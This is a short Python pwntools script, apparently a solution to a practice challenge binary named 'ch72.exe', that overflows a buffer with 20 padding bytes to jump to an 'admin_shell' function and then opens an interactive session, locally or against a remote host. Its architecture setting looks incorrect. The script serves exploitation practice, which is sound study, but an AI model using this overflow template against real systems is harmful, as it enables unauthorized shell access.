from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "./ch72.exe"
elf = context.binary = exe
context.arch = "pe32"
context.log_level = 'debug'

io = start()

padding = 20

payload = flat(
    padding * b'A',
    elf.symbols['admin_shell']
)

# write('payload', payload)

io.sendline(payload)

io.interactive()